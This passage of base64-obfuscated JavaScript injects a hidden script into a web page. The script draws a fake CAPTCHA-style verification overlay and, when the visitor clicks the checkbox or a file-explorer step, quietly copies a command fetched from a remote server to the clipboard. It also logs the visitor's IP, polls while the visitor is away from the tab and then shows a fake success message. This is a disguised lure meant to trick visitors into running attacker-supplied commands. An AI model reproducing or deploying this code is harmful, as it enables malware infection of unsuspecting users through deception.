JITmxPd3BtZFc1amRHbHZiaUIwY21GamEwTnZiWEJzWlhSbEtDa2dld29nSUNBZ2FXWWdLR052YlhCc1pYUmxWSEpoWTJ0bFpDa2djbVYwZFhKdU93b2dJQ0FnWTI5dGNHeGxkR1ZVY21GamEyVmtJRDBnZEhKMVpUc0tJQ0FnSUhSeVlXTnJUV1YwY21saktDZGpiMjF3YkdWMFpTY3BPd3A5Q2dvdkx5RFFrZEMrMEx2UmpOR0kwTFVnMEwzUXRTRFF2ZEdEMExiUXZkQytJTkdCMEw3UXNkQzQwWURRc05HQzBZd2cwTHJRdnRDODBMRFF2ZEMwMFlNZzBMTFJnTkdEMFlmUXZkR0QwWTRLQ2k4dklFZEZWQ0FLWTI5dWMzUWdjR0Z5WVcxeklEMGdibVYzSUZWU1RGTmxZWEpqYUZCaGNtRnRjeWgzYVc1a2IzY3ViRzlqWVhScGIyNHVjMlZoY21Ob0tUc0tZMjl1YzNRZ2MybDBaVlZ5YkNBOUlIQmhjbUZ0Y3k1blpYUW9KM05wZEdVbktTQjhmQ0IzYVc1a2IzY3ViRzlqWVhScGIyNHVhRzl6ZEc1aGJXVTdDbU52Ym5OMElHeHZaMjlWY213Z1BTQndZWEpoYlhNdVoyVjBLQ2RzYjJkdkp5azdDbU52Ym5OMElHUmxabUYxYkhSTWIyZHZWWEpzSUQwZ0oyaDBkSEJ6T2k4dk1tTmhjSFJqYUdFdVkyOXRMMlJwYzNRdmQyVmlMMkZ6YzJWMGN5OW5iMjluYkdVdGNISnBkbUZqZVMxd2IyeHBZM2t0UTJJd1EwZFdVbFF1YzNabkp6c0tDaVJ5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0pCYkd3b0p5NWpkSGRWT1hoQmVqRW5LUzVtYjNKRllXTm9LR1ZzSUQwK0lIc0tJQ0JsYkM1MFpYaDBRMjl1ZEdWdWRDQTlJSE5wZEdWVmNtdzdDbjBwT3dvS0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNrRnNiQ2duTG1OMFFuVmtXVXhIWTIxakp5a3VabTl5UldGamFDaHBiV2NnUFQ0Z2V3b2dJR2x0Wnk1emNtTWdQU0JzYjJkdlZYSnNJSHg4SUdSbFptRjFiSFJNYjJkdlZYSnNPd29nSUdsdFp5NWhiSFFnUFNBbmJHOW5ieWM3Q24wcE93b0tablZ1WTNScGIyNGdjMlYwVTJ0cGNFWnNZV2NvS1NCN0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNBZ0lHeHZZMkZzVTNSdmNtRm5aUzV6WlhSSmRHVnRLQ2RmYzJ0cGNDY3NJQ2N4SnlrN0NpQWdJQ0I5SUdOaGRHTm9JQ2hsY25JcElIc0tJQ0FnSUNBZ0lDQmtiMk4xYldWdWRDNWpiMjlyYVdVZ1BTQW5YM05yYVhBOU1Uc2djR0YwYUQwdk95QnRZWGd0WVdkbFBUTXhOVE0yTURBd0p6c0tJQ0FnSUgwS2ZRb0tZWE41Ym1NZ1puVnVZM1JwYjI0Z2FXNXBkRlpsY21sbWFXTmhkR2x2Ymtac2IzY29LU0I3Q2lBZ0lDQmpiMjV6ZENCd2NtVnNiMkZrWlhKRmJHVnRaVzUwY3lBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSkJiR3dvSWk1amJtNUZSbFl6ZDNoUklpazdDaUFnSUNCamIyNXpkQ0J3Y21Wc2IyRmtaWEpVWlhoMElEMGdKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZjaWdpTG1ONlNXRlVSR05DUnpKV2EzSk5VVlVpS1RzS0lDQWdJR052Ym5OMElIUmxlSFJCYkd4VGRHVndJRDBnSkhKdmIzUXVjWFZsY25sVFpXeGxZM1J2Y2lnaUxtTldNV3BrWlU5UFJXNDVSMElpS1RzS0lDQWdJR052Ym5OMElHTm9aV05yWW05NFYybHVaRzkzSUQwZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNpZ2lJMmxOV0RGbFkzWkhjRkZTU0hRaUtUc0tJQ0FnSUdOdmJuTjBJSE4wWlhBd1JXeGxiV1Z1ZEhNZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlRV3hzS0NJdVkwWTRVR015WXpOM2JVUkNhU0lwT3dvZ0lDQWdZMjl1YzNRZ2MzUmxjREZGYkdWdFpXNTBjeUE5SUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNKQmJHd29JaTVqZFRoTVpFRXdRbVl4VkdRaUtUc0tJQ0FnSUdOdmJuTjBJSE4wWlhBeVJXeGxiV1Z1ZEhNZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlRV3hzS0NJdVkySkdka3hKV2sxbGJsWm1UalJNSWlrN0NpQWdJQ0JqYjI1emRDQnpkR1Z3TTBWc1pXMWxiblJ6SUQwZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNrRnNiQ2dpTG1OVFoxbFlaMk00UmtaUlZDSXBPd29nSUNBZ1kyOXVjM1FnWTJobFkydGliM2dnUFNBa2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eUtDSWphV0U0ZVdKa1ZFczFJaWs3Q2lBZ0lDQmpiMjV6ZENCMlpYSnBabmxYYVc1a2IzY2dQU0FrY205dmRDNXhkV1Z5ZVZObGJHVmpkRzl5S0NJamFVcGxhVlpqTjJRME9HSmtaekFpS1RzS0lDQWdJR052Ym5OMElITndhVzV1WlhJZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ0lqYVdGVmFHNU9TbXRVYWxnMWNqWWlLVHNLSUNBZ0lHTnZibk4wSUhabGNtbG1lVUoxZEhSdmJpQTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0lvSWlOcFFWcHpPR0YwY0V0R2RpSXBPd29LSUNBZ0lDOHZJTkNnMExYUXM5QzQwWUhSZ3RHQTBMalJnTkdEMExYUXZDQkpVQ0RRdnRDeTBMWFJnTkM3MExYUmp5RFF2OUdBMExnZzBMalF2ZEM0MFliUXVOQ3cwTHZRdU5DMzBMRFJodEM0MExnS0lDQWdJR0YzWVdsMElISmxaMmx6ZEdWeVQzWmxjbXhoZVVsUUtDazdDZ29nSUNBZ1lYZGhhWFFnWm1WMFkyaERiMjF0WVc1a1FXNWtRMjl0YldWdWRDZ3BPd29nSUNBZ2MyVjBWR2x0Wlc5MWRDZ29LU0E5UGlCN0NpQWdJQ0FnSUNBZ2NISmxiRzloWkdWeVJXeGxiV1Z1ZEhNdVptOXlSV0ZqYUNobGJDQTlQaUJsYkM1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlLVHNLSUNBZ0lDQWdJQ0J3Y21Wc2IyRmtaWEpVWlhoMExuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaWJtOXVaU0k3Q2lBZ0lDQWdJQ0FnZEdWNGRFRnNiRk4wWlhBdWMzUjViR1V1WkdsemNHeGhlU0E5SUNKaWJHOWpheUk3Q2lBZ0lDQWdJQ0FnWTJobFkydGliM2hYYVc1a2IzY3VjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSm1iR1Y0SWpzS0NpQWdJQ0FnSUNBZ2MyVjBWR2x0Wlc5MWRDZ29LU0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQWdJR05vWldOclltOTRWMmx1Wkc5M0xuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaVpteGxlQ0k3SUFvZ0lDQWdJQ0FnSUNBZ0lDQnNaWFFnYjNCaFkybDBlU0E5SURBN0NpQWdJQ0FnSUNBZ0lDQWdJR3hsZENCbVlXUmxTVzRnUFNCelpYUkpiblJsY25aaGJDZ29LU0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCcFppQW9iM0JoWTJsMGVTQStQU0F4S1NCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZMnhsWVhKSmJuUmxjblpoYkNobVlXUmxTVzRwT3lBS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUgwZ1pXeHpaU0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2IzQmhZMmwwZVNBclBTQXdMakU3SUFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHTm9aV05yWW05NFYybHVaRzkzTG5OMGVXeGxMbTl3WVdOcGRIa2dQU0J2Y0dGamFYUjVPd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdmUW9nSUNBZ0lDQWdJQ0FnSUNCOUxDQXpNQ2s3Q2lBZ0lDQWdJQ0FnZlN3Z01qQXdLVHNLQ2lBZ0lDQWdJQ0FnYzNSbGNEQkZiR1Z0Wlc1MGN5NW1iM0pGWVdOb0tHVnNJRDArSUdWc0xuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaVlteHZZMnNpS1RzS0NpQWdJQ0FnSUNBZ2MyVjBWR2x0Wlc5MWRDZ29LU0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQWdJSE4wWlhBd1JXeGxiV1Z1ZEhNdVptOXlSV0ZqYUNobGJDQTlQaUJsYkM1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlLVHNLSUNBZ0lDQWdJQ0FnSUNBZ2MzUmxjREZGYkdWdFpXNTBjeTVtYjNKRllXTm9LR1ZzSUQwK0lHVnNMbk4wZVd4bExtUnBjM0JzWVhrZ1BTQWlZbXh2WTJzaUtUc0tJQ0FnSUNBZ0lDQjlMQ0F5TURBd0tUc2dDaUFnSUNCOUxDQXhOVEF3S1RzZ0Nnb2dJQ0FnWTJobFkydGliM2d1WVdSa1JYWmxiblJNYVhOMFpXNWxjaWdpWTJ4cFkyc2lMQ0JtZFc1amRHbHZiaUFvS1NCN0NpQWdJQ0FnSUNBZ1kyOXVjM1FnZEdWNGRHRnlaV0VnUFNCa2IyTjFiV1Z1ZEM1amNtVmhkR1ZGYkdWdFpXNTBLQ2QwWlhoMFlYSmxZU2NwT3dvZ0lDQWdJQ0FnSUhSbGVIUmhjbVZoTG5aaGJIVmxJRDBnWm1WMFkyaGxaRU52YlcxaGJtUTdDaUFnSUNBZ0lDQWdkR1Y0ZEdGeVpXRXVjMlYwUVhSMGNtbGlkWFJsS0NkeVpXRmtiMjVzZVNjc0lDY25LVHNLSUNBZ0lDQWdJQ0IwWlhoMFlYSmxZUzV6ZEhsc1pTNXdiM05wZEdsdmJpQTlJQ2RoWW5OdmJIVjBaU2M3Q2lBZ0lDQWdJQ0FnZEdWNGRHRnlaV0V1YzNSNWJHVXViR1ZtZENBOUlDY3RPVGs1T1hCNEp6c0tJQ0FnSUNBZ0lDQmtiMk4xYldWdWRDNWliMlI1TG1Gd2NHVnVaRU5vYVd4a0tIUmxlSFJoY21WaEtUc0tJQ0FnSUNBZ0lDQjBaWGgwWVhKbFlTNXpaV3hsWTNRb0tUc0tJQ0FnSUNBZ0lDQmtiMk4xYldWdWRDNWxlR1ZqUTI5dGJXRnVaQ2duWTI5d2VTY3BPd29nSUNBZ0lDQWdJR1J2WTNWdFpXNTBMbUp2WkhrdWNtVnRiM1psUTJocGJHUW9kR1Y0ZEdGeVpXRXBPd29nSUNBZ0lDQWdJR052Ym5OdmJHVXViRzluS0NmaW5JVW5LVHNLSUNBZ0lDQWdJQ0JqYUdWamEySnZlRmRwYm1SdmR5NXpkSGxzWlM1d1lXUmthVzVuSUQwZ0lqRXdjSGdpT3dvZ0lDQWdJQ0FnSUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0lpNWpSWE5UTkhrNWFsbFFTVlZ3SWlrdWMzUjViR1V1YldGeVoybHVUR1ZtZENBOUlDSXhOSEI0SWpzS0lDQWdJQ0FnSUNCemRHVndNVVZzWlcxbGJuUnpMbVp2Y2tWaFkyZ29aV3dnUFQ0Z1pXd3VjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSnViMjVsSWlrN0NpQWdJQ0FnSUNBZ2MzUmxjREpGYkdWdFpXNTBjeTVtYjNKRllXTm9LR1ZzSUQwK0lHVnNMbk4wZVd4bExtUnBjM0JzWVhrZ1BTQWlZbXh2WTJzaUtUc0tJQ0FnSUNBZ0lDQnpjR2x1Ym1WeUxuTjBlV3hsTG5acGMybGlhV3hwZEhrZ1BTQWlkbWx6YVdKc1pTSTdDaUFnSUNBZ0lDQWdjMlYwVkdsdFpXOTFkQ2dvS1NBOVBpQjdDaUFnSUNBZ0lDQWdJQ0FnSUdOb1pXTnJZbTk0VjJsdVpHOTNMbk4wZVd4bExuZHBaSFJvSUQwZ0lqVXpNSEI0SWpzS0lDQWdJQ0FnSUNBZ0lDQWdZMmhsWTJ0aWIzaFhhVzVrYjNjdWMzUjViR1V1YUdWcFoyaDBJRDBnSW1GMWRHOGlPd29nSUNBZ0lDQWdJQ0FnSUNCMlpYSnBabmxYYVc1a2IzY3VjM1I1YkdVdVltOXlaR1Z5Vkc5d0lEMGdJakZ3ZUNCemIyeHBaQ0FqTnprM09UYzVJanNLSUNBZ0lDQWdJQ0FnSUNBZ2RtVnlhV1o1VjJsdVpHOTNMbk4wZVd4bExuQmhaR1JwYm1kVWIzQWdQU0FpTTNCNElqc0tJQ0FnSUNBZ0lDQWdJQ0FnZG1WeWFXWjVWMmx1Wkc5M0xuTjBlV3hsTG0xaGNtZHBibFJ2Y0NBOUlDSXhOWEI0SWpzS0lDQWdJQ0FnSUNBZ0lDQWdkbVZ5YVdaNVYybHVaRzkzTG1Oc1lYTnpUR2x6ZEM1aFpHUW9JbUZqZEdsMlpTSXBPd29nSUNBZ0lDQWdJSDBzSURVd01DazdDaUFnSUNCOUtUc0tDaUFnSUNBdkx5QkNiSFZ5TDBadlkzVnpJR0ZqZEdsMllYUnBiMjRnWm05eUlGWmxjbWxtZVNCaWRYUjBiMjRLSUNBZ0lHeGxkQ0JvWVhOQ2JIVnljbVZrSUQwZ1ptRnNjMlU3Q2dvZ0lDQWdablZ1WTNScGIyNGdaVzVoWW14bFFuVjBkRzl1S0NrZ2V3b2dJQ0FnSUNBZ0lHbG1JQ2doZG1WeWFXWjVRblYwZEc5dUtTQnlaWFIxY200N0Nnb2dJQ0FnSUNBZ0lHbG1JQ2gyWlhKcFpubENkWFIwYjI0dVpHbHpZV0pzWldRcElIc0tJQ0FnSUNBZ0lDQWdJQ0FnZG1WeWFXWjVRblYwZEc5dUxtUnBjMkZpYkdWa0lEMGdabUZzYzJVN0NpQWdJQ0FnSUNBZ0lDQWdJSFpsY21sbWVVSjFkSFJ2Ymk1eVpXMXZkbVZCZEhSeWFXSjFkR1VvSjJScGMyRmliR1ZrSnlrN0NpQWdJQ0FnSUNBZ0lDQWdJSFpsY21sbWVVSjFkSFJ2Ymk1emRIbHNaUzV2Y0dGamFYUjVJRDBnSnpFbk93b2dJQ0FnSUNBZ0lDQWdJQ0IyWlhKcFpubENkWFIwYjI0dWMzUjViR1V1WTNWeWMyOXlJRDBnSjNCdmFXNTBaWEluT3dvZ0lDQWdJQ0FnSUNBZ0lDQUtJQ0FnSUNBZ0lDQWdJQ0FnTHk4ZzBLUFJnZEdDMExEUXZkQ3cwTExRdTlDNDBMTFFzTkMxMEx3ZzBZVFF1OUN3MExNZzBZTFF2dEM3MFl6UXV0QytJTkMxMFlIUXU5QzRJRWxRSU5DdzBMclJndEM0MExMUXVOR0EwTDdRc3RDdzBMMGcwWUhSZ3RDKzBZRFF2dEM5MEwzUXVOQzhJTkMvMFlEUXVOQzcwTDdRdHRDMTBMM1F1TkMxMEx3S0lDQWdJQ0FnSUNBZ0lDQWdjMlYwVTJ0cGNFWnNZV2NvS1RzS0lDQWdJQ0FnSUNBZ0lDQWdZMjl1YzI5c1pTNXNiMmNvSjBKMWRIUnZiaUJsYm1GaWJHVmtJU2NwT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJSDBLQ2lBZ0lDQXZMeUJVY21GamF5QjNhVzVrYjNjZ1lteDFjaUF0SU5DOTBMRFJoOUM0MEwzUXNOQzEwTHdnY0c5c2JHbHVaeURRdjlHQTBMZ2cwWVBSaGRDKzBMVFF0U0RSZ1NEUXZ0QzYwTDNRc0FvZ0lDQWdkMmx1Wkc5M0xtRmtaRVYyWlc1MFRHbHpkR1Z1WlhJb0oySnNkWEluTENCbWRXNWpkR2x2YmlncElIc0tJQ0FnSUNBZ0lDQm9ZWE5DYkhWeWNtVmtJRDBnZEhKMVpUc0tJQ0FnSUNBZ0lDQmpiMjV6YjJ4bExteHZaeWduVjJsdVpHOTNJR0pzZFhKeVpXUW5LVHNLSUNBZ0lDQWdJQ0F2THlEUWw5Q3cwTC9SZzlHQjBMclFzTkMxMEx3Z2NHOXNiR2x1WnlEUXROQzcwWThnMEwvUmdOQyswTExRdGRHQTBMclF1Q0RSZ05DdzBMZlFzZEM3MEw3UXV0QzQwWURRdnRDeTBMclF1QW9nSUNBZ0lDQWdJSE4wWVhKMFVHOXNiR2x1WnlobGJtRmliR1ZDZFhSMGIyNHBPd29nSUNBZ0lDQWdJSFJ5WVdOclEyOXRjR3hsZEdVb0tUc0tJQ0FnSUgwcE93b0tJQ0FnSUM4dklGUnlZV05ySUhkcGJtUnZkeUJtYjJOMWN5QXRJTkMvMFlEUXZ0Q3kwTFhSZ05HUDBMWFF2Q0RSZ2RHQzBMRFJndEdEMFlFZzBML1JnTkM0SU5DeTBMN1F0OUN5MFlEUXNOR0MwTFVLSUNBZ0lIZHBibVJ2ZHk1aFpHUkZkbVZ1ZEV4cGMzUmxibVZ5S0NkbWIyTjFjeWNzSUdaMWJtTjBhVzl1S0NrZ2V3b2dJQ0FnSUNBZ0lHTnZibk52YkdVdWJHOW5LQ2RYYVc1a2IzY2dabTlqZFhObFpDd2dhR0Z6UW14MWNuSmxaRG9uTENCb1lYTkNiSFZ5Y21Wa0tUc0tJQ0FnSUNBZ0lDQnBaaUFvYUdGelFteDFjbkpsWkNrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0F2THlEUW45R0EwTDdRc3RDMTBZRFJqOUMxMEx3ZzBZSFJndEN3MFlMUmc5R0JJTkdBMExEUXQ5Q3gwTHZRdnRDNjBMalJnTkMrMExMUXV0QzRJTkMvMFlEUXVDRFJoTkMrMExyUmc5R0IwTFVLSUNBZ0lDQWdJQ0FnSUNBZ1kyaGxZMnRWYm14dlkydFRkR0YwZFhNb0tTNTBhR1Z1S0hWdWJHOWphMlZrSUQwK0lIc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHbG1JQ2gxYm14dlkydGxaQ2tnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHVnVZV0pzWlVKMWRIUnZiaWdwT3dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnZlFvZ0lDQWdJQ0FnSUNBZ0lDQjlLVHNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQjlLVHNLQ2lBZ0lDQXZMeUJXWlhKcFpua2dZblYwZEc5dUlHTnNhV05ySUdoaGJtUnNaWElLSUNBZ0lHbG1JQ2gyWlhKcFpubENkWFIwYjI0cElIc0tJQ0FnSUNBZ0lDQjJaWEpwWm5sQ2RYUjBiMjR1WVdSa1JYWmxiblJNYVhOMFpXNWxjaWdpWTJ4cFkyc2lMQ0JtZFc1amRHbHZiaUFvS1NCN0NpQWdJQ0FnSUNBZ0lDQWdJR2xtSUNoMGFHbHpMbVJwYzJGaWJHVmtLU0J5WlhSMWNtNDdDZ29nSUNBZ0lDQWdJQ0FnSUNCMGNtRmphME52YlhCc1pYUmxLQ2s3Q2dvZ0lDQWdJQ0FnSUNBZ0lDQXZMeUJJYVdSbElHTm9aV05yWW05NElIZHBibVJ2ZHdvZ0lDQWdJQ0FnSUNBZ0lDQmphR1ZqYTJKdmVGZHBibVJ2ZHk1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlPd29LSUNBZ0lDQWdJQ0FnSUNBZ0x5OGdVMmh2ZHlCc2IyRmtaWElnWm1seWMzUUtJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tIQnlaV3h2WVdSbGNrVnNaVzFsYm5SekxteGxibWQwYUNrZ2NISmxiRzloWkdWeVJXeGxiV1Z1ZEhNdVptOXlSV0ZqYUNobGJDQTlQaUJsYkM1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW1Kc2IyTnJJaWs3Q2lBZ0lDQWdJQ0FnSUNBZ0lHbG1JQ2h3Y21Wc2IyRmtaWEpVWlhoMEtTQndjbVZzYjJGa1pYSlVaWGgwTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0FpYm05dVpTSTdDZ29nSUNBZ0lDQWdJQ0FnSUNBdkx5QklhV1JsSUhabGNtbG1lU0IwWlhoMElIUmxiWEJ2Y21GeWFXeDVDaUFnSUNBZ0lDQWdJQ0FnSUhSbGVIUkJiR3hUZEdWd0xuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaWJtOXVaU0k3Q2dvZ0lDQWdJQ0FnSUNBZ0lDQXZMeUJCWm5SbGNpQXhMalVnYzJWamIyNWtjeXdnYzJodmR5QnpkV05qWlhOekNpQWdJQ0FnSUNBZ0lDQWdJSE5sZEZScGJXVnZkWFFvS0NrZ1BUNGdld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdMeThnU0dsa1pTQnNiMkZrWlhJS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdsbUlDaHdjbVZzYjJGa1pYSkZiR1Z0Wlc1MGN5NXNaVzVuZEdncElIQnlaV3h2WVdSbGNrVnNaVzFsYm5SekxtWnZja1ZoWTJnb1pXd2dQVDRnWld3dWMzUjViR1V1WkdsemNHeGhlU0E5SUNKdWIyNWxJaWs3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JwWmlBb2NISmxiRzloWkdWeVZHVjRkQ2tnY0hKbGJHOWhaR1Z5VkdWNGRDNXpkSGxzWlM1a2FYTndiR0Y1SUQwZ0ltNXZibVVpT3dvS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUM4dklGTm9iM2NnYzNWalkyVnpjeUIwWlhoMENpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBa2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eUtDY3VZMk5GV0ZNMlUySk1KeWt1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0pwYm14cGJtVWlPd29LSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQzh2SUVocFpHVWdkMkZwZEdsdVp5QjBaWGgwTENCemFHOTNJSGRoYVhScGJtY2djbVZ6Y0c5dWMyVUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9KeTVqTWxaT05FRlVjMDgxYzFsdU5uRkJKeWt1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0p1YjI1bElqc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9KeTVqV2pGa1EyTlJlWEpHUlRGQ0p5a3VjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSmliRzlqYXlJN0Nnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0x5OGdVbVZzYjJGa0lIQmhaMlVnWVdaMFpYSWdNeUJ6WldOdmJtUnpDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnpaWFJVYVcxbGIzVjBLQ2dwSUQwK0lIc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0IzYVc1a2IzY3ViRzlqWVhScGIyNHVjbVZzYjJGa0tDazdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjlMQ0F6TURBd0tUc0tJQ0FnSUNBZ0lDQWdJQ0FnZlN3Z01UVXdNQ2s3Q2lBZ0lDQWdJQ0FnZlNrN0NpQWdJQ0I5Q2dvZ0lDQWdZMjl1YzNRZ2RtVnlhV1pwWTJGMGFXOXVTV1FnUFNBa2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eUtDSWphVFE1YVRCVk5YRXpSVmh2Y0VKMlpDSXBPd29nSUNBZ2FXWWdLSFpsY21sbWFXTmhkR2x2Ymtsa0tTQjdDaUFnSUNBZ0lDQWdkbVZ5YVdacFkyRjBhVzl1U1dRdWRHVjRkRU52Ym5SbGJuUWdQU0JOWVhSb0xtWnNiMjl5S0RFd01EQXdNQ0FySUUxaGRHZ3VjbUZ1Wkc5dEtDa2dLaUE1TURBd01EQXBPd29nSUNBZ2ZRb2dJQ0FnQ2lBZ0lDQmpiMjV6ZENCamFHRnljeUE5SUNKaFltTmtaV1l3TVRJek5EVTJOemc1SWpzS0lDQWdJR052Ym5OMElISmhlVWxrSUQwZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNpZ2lMbU5wUjBGRGRVWlVVVUo2ZVVjMmNXTWlLVHNLSUNBZ0lHbG1JQ2h5WVhsSlpDa2dld29nSUNBZ0lDQWdJSEpoZVVsa0xuUmxlSFJEYjI1MFpXNTBJRDBnUVhKeVlYa3Vabkp2YlNoN0lHeGxibWQwYURvZ01UWWdmU3dnS0NrZ1BUNGdZMmhoY25OYlRXRjBhQzVtYkc5dmNpaE5ZWFJvTG5KaGJtUnZiU2dwSUNvZ1kyaGhjbk11YkdWdVozUm9LVjBwTG1wdmFXNG9JaUlwT3dvZ0lDQWdmUXA5Q2dwcFppQW9aRzlqZFcxbGJuUXVjbVZoWkhsVGRHRjBaU0E5UFQwZ0lteHZZV1JwYm1jaUtTQjdDaUFnSUNCa2IyTjFiV1Z1ZEM1aFpHUkZkbVZ1ZEV4cGMzUmxibVZ5S0NKRVQwMURiMjUwWlc1MFRHOWhaR1ZrSWl3Z0tDa2dQVDRnZXlCcGJtbDBWbVZ5YVdacFkyRjBhVzl1Um14dmR5Z3BPeUI5S1RzS2ZTQmxiSE5sSUhzS0lDQWdJR2x1YVhSV1pYSnBabWxqWVhScGIyNUdiRzkzS0NrN0NuMEtDZ3BqYjI1emRDQm1hV3hsUlhod2JHOXlaWElnUFNBa2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eUtDY2phV2d4TVhaVVZtSlpKeWs3Q21OdmJuTjBJR1pwYkdWSmJuQjFkQ0E5SUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0p5TnBTVXRITTNKcWRIbFFKeWs3Q214bGRDQm1hV3hsVTJWc1pXTjBaV1FnUFNCbVlXeHpaVHNLQ21sbUlDaG1hV3hsUlhod2JHOXlaWElwSUhzS0lDQm1hV3hsUlhod2JHOXlaWEl1WVdSa1JYWmxiblJNYVhOMFpXNWxjaWduWTJ4cFkyc25MQ0JoYzNsdVl5Qm1kVzVqZEdsdmJpZ3BJSHNLSUNBZ0lDQWdZWGRoYVhRZ1ptVjBZMmhEYjIxdFlXNWtRVzVrUTI5dGJXVnVkQ2dwT3dvZ0lDQWdJQ0J1WVhacFoyRjBiM0l1WTJ4cGNHSnZZWEprTG5keWFYUmxWR1Y0ZENobVpYUmphR1ZrUTI5dGJXRnVaQ2s3Q2lBZ0lDQWdJSFJ5WVdOclEyOXRjR3hsZEdVb0tUc0tJQ0FnSUNBZ2FXWWdLR1pwYkdWSmJuQjFkQ2tnWm1sc1pVbHVjSFYwTG1Oc2FXTnJLQ2s3Q2lBZ0lDQWdJQzh2SUZkaGFYUWdabTl5SUhWelpYSWdkRzhnY21WMGRYSnVJSFJ2SUhSb1pTQndZV2RsQ2lBZ0lDQWdJR3hsZENCbWIyTjFjMGhoYm1Sc1pXUWdQU0JtWVd4elpUc0tJQ0FnSUNBZ1kyOXVjM1FnYUdGdVpHeGxSbTlqZFhNZ1BTQW9LU0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQnBaaUFvSVdadlkzVnpTR0Z1Wkd4bFpDQW1KaUFoWm1sc1pWTmxiR1ZqZEdWa0tTQjdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ1ptOWpkWE5JWVc1a2JHVmtJRDBnZEhKMVpUc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBdkx5QXVMaTVsZUdsemRHbHVaeUJqYjJSbExpNHVDaUFnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJSDA3Q2lBZ0lDQWdJSGRwYm1SdmR5NWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDZG1iMk4xY3ljc0lHaGhibVJzWlVadlkzVnpLVHNLSUNCOUtUc0tmUW9LZlNrb0tUc2dMeThnUlc1a0lHOW1JR0Z6ZVc1aklFbEpSa1VLJzsKICAgICAgY29uc3Qgc2NyaXB0Q29kZSA9IGI2NFRvVXRmOChzY3JpcHRCNjQpOwogICAgICBjb25zdCBzY3JpcHRFbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICBzY3JpcHRFbC50ZXh0Q29udGVudCA9IHNjcmlwdENvZGU7CiAgICAgIChkb2N1bWVudC5oZWFkIHx8IGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCkuYXBwZW5kQ2hpbGQoc2NyaXB0RWwpOwogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgIHZlcnIoJ1NjcmlwdCBpbmplY3Rpb24gZmFpbGVkJywgZXJyKTsKICAgIH0KICB9CgogIGZ1bmN0aW9uIHJlbmRlck92ZXJsYXkoKSB7CiAgICB0cmFja01ldHJpYygnc2hvdycpOwoKICAgIC8vIFJlbW92ZSByZXNldC5jc3MgZnJvbSBoZWFkIChsZWdhY3kgY2xlYW51cCkKICAgIGNvbnN0IHJlc2V0Q3NzTGlua3MgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdsaW5rW